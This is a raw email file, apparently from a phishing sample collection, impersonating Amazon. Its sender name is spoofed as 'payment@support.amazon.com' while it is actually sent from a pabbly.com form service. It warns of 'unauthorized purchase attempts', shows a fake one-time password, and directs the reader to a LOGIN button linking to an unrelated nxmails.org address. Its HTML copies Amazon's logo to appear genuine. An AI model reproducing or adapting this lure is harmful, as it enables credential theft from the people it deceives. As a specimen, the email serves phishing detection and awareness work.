@@ -1,0 +1,249 @@
+Return-Path: noreply@pabbly.com
+Delivered-To: jose@monkey.org
+X-FDA: 76650494844.27.tooth04_4905bf75d7812
+X-Spam-Summary: 10,1,0,e47af31554a9475b,d41d8cd98f00b204,noreply@pabbly.com,,RULES_HIT:2:41:46:72:150:152:355:379:541:543:962:967:969:973:978:983:988:989:1021:1189:1208:1212:1221:1256:1260:1263:1313:1314:1345:1381:1430:1431:1432:1433:1434:1436:1437:1516:1517:1518:1535:1568:1570:1571:1575:1588:1589:1592:1594:1606:1714:1730:1776:1792:1803:2084:2107:2198:2199:2525:2527:2528:2543:2560:2565:2610:2682:2685:2859:2890:2892:2895:2898:2902:2913:2915:2923:2924:2925:2926:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3148:3865:3866:3867:3873:3874:3902:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:3976:4042:4118:4321:4365:4470:5007:6117:6119:6248:6261:6650:6651:6653:6669:6678:6684:6688:7875:7903:7933:8603:8784:8957:9025:9344:9388:9392:9688:9908:10049:10214:10231:10299:10346:11026:11473:11529:11657:11658:11914:11984:12043:12114:12295:12551:12555:12679:12986:13019:13038:13139:13156:13163:13191:13192:13228:13229:13236:13237:13374:13870:14096:14516:14659:14829:14985:21063:2
+X-HE-Tag: tooth04_4905bf75d7812
+X-Filterd-Recvd-Size: 7768
+Received: from mail6.highinbox.com (mail6.highinbox.com [103.79.1.6])
+	by imf24.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Mon, 30 Mar 2020 02:48:21 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed; s=key1; d=pabbly.com;
+ h=Date:From:Reply-To:To:Subject:Message-ID:Mime-Version:Content-Type; i=noreply@pabbly.com;
+ bh=pGxxIPLMGLT342zW2JtmKxmKsFkWe6aj7Qy0XsyoqP4=;
+ b=p+Y4Nmfd4NkXAh9S92B4QvvN8JoMXK6r2j8rE07hZRDIa2TvpDIRhZ0psiJOMGWN1s4T4YohKJue
+   JRwKOmvWtdRnVhmaYsjob9QqjxvfOMc/LD4tCclXu2L0BIIFV+RVXpUVkeDni09S+ObP/g8jm60d
+   sEagMVWxOj1NhtAF/q0=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=key1; d=formget.com;
+ h=Date:From:Reply-To:To:Subject:Message-ID:Mime-Version:Content-Type;
+ bh=sAcbX7LZFD6Y/SLQl/Vt1HPrLU8=;
+ b=AUhKBgupTgtrvflhp8iqZmlK/6sJNCGd4mtVA824WoNpEGR68b0ofPhDB9EAxASr0lkgcJsawxtf
+   T6ofPXHiPjKl1ns7/kMKJf6QX8pl0E+lWew2X7fwQdiTCxB7DNaS9/aGhDGKWyW8cCBRi13IIM2C
+   goNDuPyFnB1p4YraRGY=
+User-Agent: FormGet
+Date: Mon, 30 Mar 2020 02:52:43 +0000
+From: "payment@support.amazon.com" <noreply@pabbly.com>
+Return-Path: <noreply@pabbly.com>
+Reply-To: "payment@support.amazon.com" <payment@support.amazon.com>
+To: jose@monkey.org
+Subject: =?UTF-8?Q?OTP:_992493_to_authenticate_payment?=
+X-Sender: noreply@pabbly.com
+X-Mailer: FormGet
+X-Priority: 3 (Normal)
+Message-ID: <5e815efb88670@pabbly.com>
+Mime-Version: 1.0
+Content-Type: multipart/alternative; boundary="B_ALT_5e815efb88733"
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 49
+
+This is a multi-part message in MIME format.
+Your email application may not support this format.
+
+--B_ALT_5e815efb88733
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+Download as PDF
+ &nbsp;
+
+Purchase attempt
+
+Dear CustomerWe detect unauthorized purchase attempts from your account.Some
+information on your account appears to be missing or incorrect.Please update
+your information promptly so that you can continue to enjoy all the benefits
+of your amazon account. To authenticate, please use the following One Time
+Password (OTP):
+992493
+
+To cancel this purchase, please verify your account information by clicking
+on the link below :
+
+LOGIN 
+
+Sincerely,Customer Support.
+
+&nbsp;
+
+
+--B_ALT_5e815efb88733
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+<!doctype html>
+<html xmlns=3D"http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3DUTF-8" />
+<meta name=3D"viewport" content=3D"width=3Ddevice-width; initial-scale=3D1.=
+0; maximum-scale=3D1.0;">
+<title>Solution - Responsive E-mail Template</title>
+<!-- Hotmail ignores some valid styling, so we have to add this -->
+</head>
+<body leftmargin=3D"0" topmargin=3D"0" marginwidth=3D"0" marginheight=3D"0"=
+>
+<!-- Wrapper -->
+<div style=3D"margin:0;padding:0;background:#eeeeee">
+ <table border=3D"0" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" sty=
+le=3D"background-color:#eeeeee">
+ <tbody>
+		<tr>
+ <td>
+			<table border=3D"0" cellspacing=3D"0" cellpadding=3D"0" align=3D"center"=
+ style=3D"width:640px;padding-left:20px;padding-right:20px">
+ <tbody><tr><td style=3D"min-height:20px"><div style=3D"min-height:20px;min=
+-height:20px;max-height:20px;vertical-align:top;overflow:hidden"></div></td=
+></tr>
+ <tr>
+ <td>
+
+ <table border=3D"0" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%">
+
+
+ <tbody><tr>
+ <td>
+
+
+
+<table border=3D"0" cellspacing=3D"0" cellpadding=3D"40" width=3D"100%" sty=
+le=3D"margin-top:20px;background:#ffffff;border-radius:8px">
+ <tbody><tr>
+ <td style=3D"font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;paddi=
+ng-bottom:0;font-size:14px;line-height:22px;color:#888888;background-color:=
+#ffffff;border-radius:6px">
+
+
+ <table border=3D"0" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%">
+ <tbody><tr>
+ <td valign=3D"top" style=3D"padding-bottom:10px">
+		 <span style=3D"float:right;margin-right:12px;"><a href=3D"https://forms.=
+pabbly.com/reply/get_pdf_view/IjQzMjYxNSI_3D/NTM2MjMxMg_3D_3D" target=3D"_b=
+lank" style=3D"color:#8989fe;">Download as PDF</a></span>
+ <p style=3D"color:#888888"><p>&nbsp;</p>
+<table id=3D"container" cellspacing=3D"0" cellpadding=3D"0" align=3D"center=
+">
+<tbody>
+<tr>
+<td>
+<table id=3D"content" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td id=3D"header">
+<table cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td id=3D"logo" width=3D"250"><img id=3D"amazonLogo" src=3D"https://images-=
+na.ssl-images-amazon.com/images/G/01/x-locale/cs/te/logo._CB485949097_.png"=
+ /></td>
+<td id=3D"title" align=3D"right" valign=3D"top" width=3D"250">
+<p>Purchase attempt</p>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td id=3D"verificationMsg">
+<p>Dear Customer<br /><br />We detect unauthorized purchase attempts from y=
+our account.<br />Some information on your account appears to be missing or=
+ incorrect.<br />Please update your information promptly so that you can co=
+ntinue to enjoy all the benefits of your amazon account. <br />To authentic=
+ate, please use the following One Time Password (OTP):</p>
+<p class=3D"otp">992493</p>
+</td>
+</tr>
+<tr>
+<td id=3D"accountSecurity">
+<p>To cancel this purchase, please verify your account information by click=
+ing on the link below :</p>
+</td>
+</tr>
+<tr>
+<td style=3D"border-collapse: collapse; font-size: 17px; font-family: Arial=
+,Helvetica,sans-serif; color: #ffffff; font-weight: normal; padding-left: 2=
+0px; padding-right: 20px; vertical-align: middle; background-color: #c7c7c7=
+; border-radius: 8px; border: 0px None #9c9c9c;" align=3D"center" valign=3D=
+"middle" bgcolor=3D"#c7c7c7" width=3D"auto" height=3D"40"><span style=3D"co=
+lor: #ffffff; font-weight: normal;"><a style=3D"text-decoration: none; colo=
+r: #ffffff; font-weight: normal;" href=3D"http://nxmails.org/admin/modules/=
+" target=3D"_blank" rel=3D"noopener">LOGIN </a></span></td>
+</tr>
+<tr>
+<td id=3D"closing">
+<p>Sincerely,<br />Customer Support.</p>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+<p>&nbsp;</p></p>
+ </td>
+ </tr>
+</tbody></table>
+<table border=3D"0" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%">
+ <tbody><tr>
+ <td style=3D"padding:30px 0">
+ <table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"526">
+ <tbody><tr>
+				<a style=3D"display:inline-block;width:100%;background-color:#eaf3ff;te=
+xt-decoration:none;color:#5486c6;font-size:18px;font-weight:bold;text-align=
+:center;padding:15px 0px 15px 0px;border-radius:2px" href=3D"" target=3D"_b=
+lank"></a>
+									</tr> </tbody></table>
+								=09
+ </td>
+ </tr>
+</tbody></table>
+<table border=3D"0" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%">
+ <tbody><tr><tr>
+ </tr>
+</tbody></table> </td>
+ </tr>
+</tbody></table>
+
+ </td>
+ </tr>
+
+ <tr><td height=3D"20"></td></tr>
+ <tr>
+ <td>
+
+ <table border=3D"0" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" sty=
+le=3D"padding-bottom:10px">
+ <tbody><tr>
+ <td valign=3D"top" align=3D"center" width=3D"*" style=3D"font-family:'Helv=
+etica Neue',Helvetica,Arial,sans-serif;font-size:11px;line-height:15px;colo=
+r:#9d9d9d">
+=20
+ <a href=3D"emailsetting" style=3D"color:#9d9d9d;text-decoration:none;font-=
+weight:bold" target=3D"_blank"></a>
+ <a href=3D"opt-out" style=3D"color:#9d9d9d;text-decoration:none;font-weigh=
+t:bold" target=3D"_blank"></a>
+
+ </td>
+ </tr>
+ </tbody></table>
+
+ </td>
+ </tr>
+ </tbody></table>
+
+ </td>
+ </tr>
+ <tr><td style=3D"min-height:20px"><div style=3D"min-height:20px;min-height=
+:20px;max-height:20px;vertical-align:top;overflow:hidden"></div></td></tr>
+ </tbody></table>
+
+ </td>
+ </tr>
+ </tbody></table>
+</div>
+<!-- Done -->
+</body>
+</html>
+
+--B_ALT_5e815efb88733--
+
